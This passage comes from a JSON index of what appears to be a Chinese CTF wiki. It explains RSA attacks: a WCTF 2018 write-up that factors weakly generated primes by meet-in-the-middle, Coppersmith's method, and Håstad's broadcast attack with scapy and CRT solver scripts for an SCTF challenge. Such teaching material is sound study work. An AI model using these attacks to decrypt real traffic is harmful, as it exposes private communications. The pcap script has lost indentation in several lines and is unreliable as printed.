\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u6b21\u504f\u79fb 32 \u4e2a\u5b57\u8282\u3002</p> <pre><code>    _ENCRYPT_STR = ENCRYPTED_STR;\n    v10 = 0;\n    ENCRYPTED_LEN = strlen(ENCRYPTED_STR);\n    do\n    {\n      do\n        ++v9;\n      while ( strncmp(&amp;file_contents[v9], _ENCRYPT_STR, ENCRYPTED_LEN) );\n      ++v10;\n    }\n    while ( v10 &lt;= 1 );\n    v11 = &amp;file_start_off_32[loc2 + ENCRYPTED_LEN];\n    v12 = loc2 + ENCRYPTED_LEN;\n    len = file_size - (loc2 + ENCRYPTED_LEN) - 32;\n    decrypt(&amp;file_start_off_32[v12], &amp;license, len);\n    sha256_file_start(v11, len, &amp;output);\n    if ( !memcmp(&amp;output, &amp;file_contents[v12], 0x20u) )\n    {\n      v14 = fopen(\"out.exe\", \"wb\");\n      fwrite(v11, 1u, len, v14);\n      fclose(v14);\n      sprintf(byte_406020, \"out.exe %s\", argv[1]);\n      system(byte_406020);\n    }\n</code></pre> <p>\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u751f\u6210\u7684\u6587\u4ef6\u7684\u6821\u9a8c\u5bf9\u5e94\u7684\u54c8\u5e0c\u503c\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u503c\uff0c\u7531\u4e8e\u6587\u4ef6\u6700\u540e\u662f\u4e00\u4e2a exe \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6700\u540e\u7684\u6587\u4ef6\u5934\u5c31\u662f\u6807\u51c6\u7684 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u59cb\u7684 license \u6587\u4ef6\uff0c\u8fdb\u800c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 python \u811a\u672c\u751f\u6210 exe\u3002</p> <p>\u5728\u751f\u6210\u7684 exe \u4e2d\uff0c\u6211\u4eec\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a</p> <ol> <li>\u8bfb\u53d6 license</li> <li>\u4f7f\u7528 license \u4f5c\u4e3a seed \u5206\u522b\u751f\u6210 pq</li> <li>\u5229\u7528 p\uff0cq \u751f\u6210 n\uff0ce\uff0cd\u3002</li> </ol> <p>\u5176\u6f0f\u6d1e\u51fa\u73b0\u5728\u751f\u6210 p\uff0cq \u7684\u65b9\u6cd5\u4e0a\uff0c\u800c\u4e14\u751f\u6210 p \u548c q \u7684\u65b9\u6cd5\u7c7b\u4f3c\u3002</p> <p>\u6211\u4eec\u5982\u679c\u4ed4\u7ec6\u5206\u6790\u4e0b\u751f\u6210\u7d20\u6570\u7684\u51fd\u6570\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7d20\u6570\u90fd\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u751f\u6210\u7684</p> <ol> <li>\u751f\u6210\u5de6\u534a\u90e8\u5206 512 \u4f4d\u3002</li> <li>\u751f\u6210\u53f3\u534a\u90e8\u5206 512 \u4f4d\u3002</li> <li>\u5de6\u53f3\u6784\u6210 1024 \u6bd4\u7279\u4f4d\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7d20\u6570\uff0c\u662f\u7d20\u6570\u5c31\u6210\u529f\uff0c\u4e0d\u662f\u7d20\u6570\uff0c\u7ee7\u7eed\u751f\u6210\u3002</li> </ol> <p>\u5176\u4e2d\u751f\u6210\u6bcf\u90e8\u5206\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u65b9\u5f0f\u4e3a</p> <pre><code>sha512(const1|const2|const3|const4|const5|const6|const7|const8|v9)\nv9=r%1000000007\n</code></pre> <p>\u53ea\u6709 v9 \u4f1a\u6709\u6240\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u7684\u8303\u56f4\u5374\u662f\u56fa\u5b9a\u7684\u3002</p> <p>\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u8868\u793a p\uff0cq \u4e3a</p> <p>p=a*2^{512}+b</p> <p>q=c*2^{512}+d</p> <p>\u90a3\u4e48</p> <p>n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd</p> <p>\u90a3\u4e48</p> <p>n \\equiv bd \\bmod 2^{512}</p> <p>\u800c\u4e14\u7531\u4e8e p \u548c q \u5728\u751f\u6210\u65f6\uff0ca\uff0cb\uff0cc\uff0cd \u5747\u53ea\u6709 1000000007 \u79cd\u53ef\u80fd\u6027\u3002</p> <p>\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u9996\u5148\u8ba1\u7b97\u51fa b \u53ef\u80fd\u7684\u96c6\u5408\u4e3a S\uff0c\u540c\u65f6\u6211\u4eec\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u8ba1\u7b97</p> <p>n/d \\equiv b \\bmod 2^{512}</p> <p>\u8fd9\u91cc\u7531\u4e8e b \u548c d \u90fd\u662f p \u7684\u5c3e\u6570\uff0c\u6240\u4ee5\u4e00\u5b9a\u4e0d\u4f1a\u662f 2 \u7684\u500d\u6570\uff0c\u8fdb\u800c\u5fc5\u7136\u5b58\u5728\u9006\u5143\u3002</p> <p>\u8fd9\u6837\u505a\u867d\u7136\u53ef\u4ee5\uff0c\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7b97\u4e00\u4e0b\u5b58\u50a8\u7a7a\u95f4</p> <p>64*1000000007 / 1024 / 1024 / 1024=59</p> <p>\u4e5f\u5c31\u662f\u8bf4\u9700\u8981 59 G\uff0c\u592a\u5927\u4e86\uff0c\uff0c\u6240\u4ee5\u6211\u4eec\u4ecd\u7136\u9700\u8981\u8fdb\u4e00\u6b65\u8003\u8651</p> <p>n \\equiv bd \\bmod 2^{64}</p> <p>\u8fd9\u6837\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9700\u6c42\u77ac\u95f4\u5c31\u964d\u5230\u4e86 8 G\u5de6\u53f3\u3002\u6211\u4eec\u4ecd\u7136\u4f7f\u7528\u679a\u4e3e\u7684\u65b9\u6cd5\u8fdb\u884c\u8fd0\u7b97\u3002</p> <p>\u5176\u6b21\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 python\uff0c\uff0cpython \u5360\u636e\u7a7a\u95f4\u592a\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 c/c++ \u7f16\u5199\u3002</p> <p>\u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 d \u8ba1\u7b97\u5bf9\u5e94\u7684\u503c n/d \u5982\u679c\u5bf9\u5e94\u7684\u503c\u5728\u96c6\u5408 S \u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u627e\u5230\u4e86\u4e00\u5bf9\u5408\u6cd5\u7684 b \u548c d\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u6062\u590d p \u548c q \u7684\u4e00\u534a\u3002</p> <p>\u4e4b\u540e\uff0c\u6211\u4eec\u6839\u636e</p> <p>n-bd=ac*2^{1024}+(ad+bc)*2^{512}</p> <p>\u53ef\u4ee5\u5f97\u5230</p> <p>\\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc</p> <p>\\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512}</p> <p>\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa a \u548c c\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u5168\u6062\u590d\u51fa p \u548c q\u3002</p> <p>\u5728\u5177\u4f53\u6c42\u89e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u6c42 p \u548c q \u7684\u4e00\u90e8\u5206\u65f6\uff0c\u53ef\u4ee5\u53d1\u73b0\u56e0\u4e3a\u662f\u6a21 2^{64}\uff0c\u6240\u4ee5\u53ef\u80fd\u5b58\u5728\u78b0\u649e\uff08\u4f46\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u662f p\uff0c\u53e6\u5916\u4e00\u4e2a\u662fq\uff0c\u6070\u597d\u5bf9\u79f0\u3002\uff09\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 b \u5bf9\u5e94\u7684 v9\u3002</p> <p>\u6ce8\u610f\uff1a\u8fd9\u91cc\u679a\u4e3e\u51fa\u6765\u7684\u7a7a\u95f4\u5927\u7ea6\u5360\u7528 11 \u4e2a G\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u6240\u4ee5\u8bf7\u9009\u62e9\u5408\u9002\u7684\u4f4d\u7f6e\u3002</p> <pre><code>b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137\nsearch 23000000\nsearch 32000000\nsearch 2b000000\nsearch d000000\nsearch 3a000000\nsearch 1c000000\nsearch 6000000\nsearch 24000000\nsearch 15000000\nsearch 33000000\nsearch 2c000000\nsearch e000000\nb64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175\nsearch 1d000000\nsearch 3b000000\nsearch 7000000\nsearch 16000000\nsearch 25000000\nsearch 34000000\n</code></pre> <p>\u5176\u5b9e\uff0c\u6211\u4eec\u5728\u771f\u6b63\u5f97\u5230 p \u6216\u8005 q \u7684\u4e00\u90e8\u5206\u540e\uff0c\u53e6\u5916\u4e00\u90e8\u5206\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u679a\u4e3e\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u56e0\u4e3a\u8ba1\u7b97\u91cf\u51e0\u4e4e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6700\u540e\u7ed3\u679c\u4e3a</p> <pre><code>...\nhash 7000000\nhash 30000000\np = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869\nq = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283\nplain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\nhash 16000000\nhash 25000000\nhash b000000\nhash 34000000\nhash 1a000000\n...\n\u279c  2018-WCTF-rsa git:(master) \u2717 python\nPython 2.7.14 (default, Mar 22 2018, 14:43:05)\n[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; p=13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885\n&gt;&gt;&gt; hex(p)[2:].decode('hex')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\", line 42, in hex_decode\n    output = binascii.a2b_hex(input)\nTypeError: Odd-length string\n&gt;&gt;&gt; hex(p)[2:-1].decode('hex')\n'flag{fa6778724ed740396fc001b198f30313}'\n</code></pre> <p>\u6700\u540e\u6211\u4eec\u4fbf\u62ff\u5230 flag \u4e86\u3002</p> <p>\u8be6\u7ec6\u7684\u5229\u7528\u4ee3\u7801\u8bf7\u53c2\u89c1 ctf-challenge \u4ed3\u5e93\u3002</p> <p>\u76f8\u5173\u7f16\u8bd1\u6307\u4ee4\uff0c\u9700\u8981\u94fe\u63a5\u76f8\u5173\u7684\u5e93\u3002</p> <pre><code>g++  exp2.cpp -std=c++11 -o main2 -lgmp -lcrypto -pthread\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#_1","title":"\u53c2\u8003","text":"<ul> <li>https://upbhack.de/posts/wctf-2018-writeup-rsa/</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/","title":"Coppersmith \u76f8\u5173\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1","title":"\u57fa\u672c\u539f\u7406","text":"<p>Coppersmith \u76f8\u5173\u653b\u51fb\u4e0eDon Coppersmith \u7d27\u5bc6\u76f8\u5173\uff0c\u4ed6\u63d0\u51fa\u4e86\u4e00\u79cd\u9488\u5bf9\u4e8e\u6a21\u591a\u9879\u5f0f\uff08\u5355\u53d8\u91cf\uff0c\u4e8c\u5143\u53d8\u91cf\uff0c\u751a\u81f3\u591a\u5143\u53d8\u91cf\uff09\u627e\u6240\u6709\u5c0f\u6574\u6570\u6839\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u65b9\u6cd5\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u5047\u8bbe</p> <ul> <li>\u6a21\u6570\u4e3a N \uff0cN \u5177\u6709\u4e00\u4e2a\u56e0\u5b50 b\\geq N^{\\beta},0&lt; \\beta \\leq 1</li> <li>\u591a\u9879\u5f0f F \u7684\u6b21\u6570\u4e3a \\delta</li> </ul> <p>\u90a3\u4e48\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5728O(c\\delta^5log^9(N)) \u7684\u590d\u6742\u5ea6\u5185\u627e\u5230\u8be5\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839x_0\uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u6c42 |x_0|&lt;cN^{\\frac{\\beta^2}{\\delta}} \u3002</p> <p>\u5728\u8fd9\u4e2a\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u627e\u5230\u5728\u6a21 N \u610f\u4e49\u4e0b\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839\uff0c\u8fd9\u4e00\u95ee\u9898\u88ab\u8ba4\u4e3a\u662f\u590d\u6742\u7684\u3002Coppersmith method \u4e3b\u8981\u662f\u901a\u8fc7 Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm\uff08LLL\uff09\u65b9\u6cd5\u627e\u5230</p> <ul> <li>\u4e0e\u8be5\u591a\u9879\u5f0f\u5177\u6709\u76f8\u540c\u6839 x_0</li> <li>\u66f4\u5c0f\u7cfb\u6570</li> <li>\u5b9a\u4e49\u57df\u4e3a\u6574\u6570\u57df</li> </ul> <p>\u7684\u591a\u9879\u5f0f g\uff0c\u7531\u4e8e\u5728\u6574\u6570\u57df\u4e0a\u627e\u591a\u9879\u5f0f\u7684\u6839\u662f\u7b80\u5355\u7684\uff08Berlekamp\u2013Zassenhaus\uff09\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u539f\u591a\u9879\u5f0f\u5728\u6a21\u610f\u4e49\u4e0b\u7684\u6574\u6570\u6839\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06 f \u8f6c\u6362\u5230 g \u5462\uff1fHowgrave-Graham \u7ed9\u51fa\u4e86\u4e00\u79cd\u601d\u8def</p> <p></p> <p>\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5177\u6709\u201c\u66f4\u5c0f\u7cfb\u6570\u201d\u7684\u591a\u9879\u5f0f g\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u7684\u8f6c\u6362\u65b9\u5f0f</p> <p></p> <p>\u5728 LLL \u7b97\u6cd5\u4e2d\uff0c\u6709\u4e24\u70b9\u662f\u975e\u5e38\u6709\u7528\u7684</p> <ul> <li>\u53ea\u5bf9\u539f\u6765\u7684\u57fa\u5411\u91cf\u8fdb\u884c\u6574\u6570\u7ebf\u6027\u53d8\u6362\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5728\u5f97\u5230 g \u65f6\uff0c\u4ecd\u7136\u4ee5\u539f\u6765\u7684 x_0 \u4e3a\u6839\u3002</li> <li>\u751f\u6210\u7684\u65b0\u7684\u57fa\u5411\u91cf\u7684\u6a21\u957f\u662f\u6709\u754c\u7684\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5229\u7528 Howgrave-Graham \u5b9a\u7406\u3002</li> </ul> <p>\u5728\u8fd9\u6837\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u6211\u4eec\u518d\u6784\u9020\u51fa\u591a\u9879\u5f0f\u65cf g \u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u5173\u4e8e\u66f4\u52a0\u7ec6\u8282\u7684\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\u540c\u65f6\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u4e0d\u65ad\u66f4\u65b0\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e Coppersmith \u6839\u7684\u7ea6\u675f\uff0c\u5728 RSA \u4e2d\u7684\u5e94\u7528\u65f6\uff0c\u5f80\u5f80\u53ea\u9002\u7528\u4e8e e \u8f83\u5c0f\u7684\u60c5\u51b5\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_2","title":"\u57fa\u672c\u7528\u6cd5","text":"<p>\u6700\u76f4\u63a5\u7684Coppersmith\u7528\u6cd5\uff08\u6c42\u89e3\u65b9\u7a0b\u5c0f\u6839\uff09</p> <pre><code>sage: R.&lt;m&gt; = PolynomialRing(Zmod(n))                                                          \nsage: f = m^2 - (c1+c2)*m + c1*c2                                                              \nsage: x0 = f.small_roots(X=2^400)                                                              \nsage: print(x0)                                                                                \n[4242839043019782000788118887372132807371568279472499477998758466224002905442227156537788110520335652385855]\n</code></pre> <p>\u4ee5\u4e0b\u662f sagemath \u6587\u6863\u4e2d\u5bf9 <code>small_roots()</code> \u5404\u4e2a\u53c2\u6570\u7684\u8bf4\u660e.</p> <p><code>sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(*self*, *X=None*, *beta=1.0*, *epsilon=None*, ***kwds*)</code></p> <p>Let NN be the characteristic of the base ring this polynomial is defined over: <code>N = self.base_ring().characteristic()</code>. This method returns small roots of this polynomial modulo some factor bb of NN with the constraint that b&gt;=N\u03b2b&gt;=N\u03b2. Small in this context means that if xx is a root of ff modulo bb then |x|&lt;X|x|&lt;X. This XX is either provided by the user or the maximum XX is chosen such that this algorithm terminates in polynomial time. If XX is chosen automatically it is X=ceil(\u00bdN\u03b22/\u03b4\u2212\u03f5)X=ceil(\u00bdN\u03b22/\u03b4\u2212\u03f5). The algorithm may also return some roots which are larger than XX. \u2018This algorithm\u2019 in this context means Coppersmith\u2019s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May\u2019s PhD thesis referenced below.</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#basic-broadcast-attack","title":"Basic Broadcast Attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_3","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_4","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 n_1,n_2,n_3 \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b</p>  \\begin{align*} c_1&amp;=m^3\\bmod n_1 \\\\ c_2&amp;=m^3\\bmod n_2 \\\\ c_3&amp;=m^3\\bmod n_3 \\end{align*}  <p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe n_1,n_2,n_3 \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe m&lt;n_i, 1\\leq i \\leq 3\u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002</p> <p>\u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97m^3 \\equiv C \\bmod n_1n_2n_3\u3002</p> <p>\u6b64\u5916\uff0c\u65e2\u7136 m&lt;n_i, 1\\leq i \\leq 3\uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 m^3 &lt; n_1n_2n_3 \u5e76\u4e14 C&lt;m^3 &lt; n_1n_2n_3\uff0c\u90a3\u4e48 m^3 = C\uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002</p> <p>\u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3-level4","title":"SCTF RSA3 LEVEL4","text":"<p>\u53c2\u8003 http://ohroot.com/2016/07/11/rsa-in-ctf\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b</p> <pre><code>#!/usr/bin/env python\n\nfrom scapy.all import *\nimport zlib\nimport struct\n\nPA = 24\npackets = rdpcap('./syc_security_system_traffic3.pcap')\nclient = '192.168.1.180'\nlist_n = []\nlist_m = []\nlist_id = []\ndata = []\nfor packet in packets:\n    # TCP Flag PA 24 means carry data\nif packet[TCP].flags == PA or packet[TCP].flags == PA + 1:\n        src = packet[IP].src\n        raw_data = packet[TCP].load\n        head = raw_data.strip()[:7]\nif head == \"We have\":\n            n, e = raw_data.strip().replace(\"We have got N is \",\n                                            \"\").split('\\ne is ')\ndata.append(n.strip())\nif head == \"encrypt\":\n            m = raw_data.replace('encrypted messages is 0x', '').strip()\ndata.append(str(int(m, 16)))\n\nwith open('./data.txt', 'w') as f:\n    for i in range(0, len(data), 2):\n        tmp = ','.join(s for s in data[i:i + 2])\nf.write(tmp + '\\n')\n</code></pre> <p>\u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002</p> <pre><code>from functools import reduce\nimport gmpy\nimport json, binascii\n\n\ndef modinv(a, m):\n    return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))\n\n\ndef chinese_remainder(n, a):\n    sum = 0\n    prod = reduce(lambda a, b: a * b, n)\n    # \u5e76\u884c\u8fd0\u7b97\n    for n_i, a_i in zip(n, a):\n        p = prod // n_i\n        sum += a_i * modinv(p, n_i) * p\n    return int(sum % prod)\n\n\nnset = []\ncset = []\nwith open(\"data.txt\") as f:\n    now = f.read().strip('\\n').split('\\n')\n    for item in now:\n        item = item.split(',')\n        nset.append(int(item[0]))\n        cset.append(int(item[1]))\n\nm = chinese_remainder(nset, cset)\nm = int(gmpy.mpz(m).root(19)[0])\nprint binascii.unhexlify(hex(m)[2:-1])\n</code></pre> <p>\u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002</p> <pre><code>H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_5","title":"\u9898\u76ee","text":"<ul> <li>2017 WHCTF OldDriver</li> <li>2018 N1CTF easy_fs</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#broadcast-attack-with-linear-padding","title":"Broadcast Attack with Linear Padding","text":"<p>\u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 Coppersmith method \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003</p> <ul> <li>https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack","title":"Related Message Attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_6","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b</p>  M_1 \\equiv f(M_2) \\bmod N  <p>\u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 f=ax+b\u3002</p> <p>\u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a O(elog^2N)\u3002</p> <p>\u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_7","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 C_1 \\equiv M_1 ^e \\bmod N\uff0c\u5e76\u4e14 M_1 \\equiv f(M_2) \\bmod N\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 M_2 \u662f f(x)^e \\equiv C_1 \\bmod N \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b f(x)^e-C_1 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0cM_2 \u662f x^e - C_2 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 x-M_2 \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 M_2\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 e=3 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002</p> 